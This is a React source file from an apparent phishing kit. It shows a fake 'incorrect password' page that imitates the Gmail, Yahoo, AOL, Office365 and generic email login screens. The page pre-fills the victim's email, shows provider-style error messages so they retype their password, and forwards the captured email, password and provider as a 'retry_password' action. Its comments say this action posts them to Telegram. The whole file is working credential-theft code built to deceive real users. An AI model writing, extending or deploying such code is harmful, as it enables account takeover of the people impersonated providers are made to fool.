import React from 'react';
import { useLocation } from 'react-router-dom';
import { ProviderKey } from './providerTheme';
import GmailLoginPage from '../GmailLoginPage';
import YahooLoginPage from '../YahooLoginPage';
import AolLoginPage from '../AolLoginPage';
import OthersLoginPage from '../OthersLoginPage';
import Office365Wrapper from '../Office365Wrapper';

interface IncorrectPasswordPageProps {
  providerKey: ProviderKey;
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

/**
 * Per-provider "incorrect password" page.
 *
 * To guarantee the UI is identical to the real provider login screens, this
 * component renders the actual provider login page (GmailLoginPage,
 * YahooLoginPage, AolLoginPage, OthersLoginPage, Office365Wrapper) instead of
 * a hand-crafted mock. The login page is started at its password step with
 * the email pre-filled and a provider-appropriate error banner injected.
 *
 * When the user submits the password again, the provider login page calls
 * `onLoginSuccess`, which we forward to `onAction('retry_password', { ... })`
 * so App.tsx posts the retry to Telegram and routes the user out.
 */
const IncorrectPasswordPage: React.FC<IncorrectPasswordPageProps> = ({ providerKey, onAction }) => {
  const location = useLocation();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const backendMessage = (data.message as string) || '';

  const defaultErrorByProvider: Record<ProviderKey, string> = {
    gmail: 'Wrong password. Try again or click Forgot password to reset it.',
    office365: "Your account or password is incorrect. If you don't remember your password, reset it now.",
    yahoo: 'Invalid password. Please try again.',
    aol: 'Invalid password. Please try again.',
    others: 'The password you entered is incorrect. Please try again.',
  };
  const incorrectPasswordError = backendMessage || defaultErrorByProvider[providerKey];

  // Forward the resubmitted credentials as a `retry_password` interaction so
  // App.tsx's handleInteractiveAction posts them to Telegram.
  const handleRetrySubmit = (loginData: any) => {
    onAction('retry_password', {
      email: loginData?.email || email,
      password: loginData?.password,
      provider: loginData?.provider || providerKey,
    });
  };

  const handleRetryError = (error: string) => {
    onAction('retry_password_error', { message: error });
  };

  if (providerKey === 'gmail') {
    return (
      <GmailLoginPage
        defaultEmail={email}
        startAtPasswordStep
        incorrectPasswordError={incorrectPasswordError}
        onLoginSuccess={handleRetrySubmit}
        onLoginError={handleRetryError}
      />
    );
  }

  if (providerKey === 'yahoo') {
    return (
      <YahooLoginPage
        defaultEmail={email}
        startAtPasswordStep
        incorrectPasswordError={incorrectPasswordError}
        onLoginSuccess={handleRetrySubmit}
        onLoginError={handleRetryError}
      />
    );
  }

  if (providerKey === 'aol') {
    return (
      <AolLoginPage
        defaultEmail={email}
        startAtPasswordStep
        incorrectPasswordError={incorrectPasswordError}
        onLoginSuccess={handleRetrySubmit}
        onLoginError={handleRetryError}
      />
    );
  }

  if (providerKey === 'office365') {
    // Office365's login UI is an iframe (/office.365.html); jump it straight
    // to its password step with the email pre-filled and the error banner so
    // the user is not sent back through the email step.
    return (
      <Office365Wrapper
        defaultEmail={email}
        startAtPasswordStep
        incorrectPasswordError={incorrectPasswordError}
        onLoginSuccess={handleRetrySubmit}
        onLoginError={handleRetryError}
      />
    );
  }

  // Others / generic
  return (
    <OthersLoginPage
      defaultEmail={email}
      startAtPasswordStep
      incorrectPasswordError={incorrectPasswordError}
      onLoginSuccess={handleRetrySubmit}
      onLoginError={handleRetryError}
    />
  );
};

export default IncorrectPasswordPage;
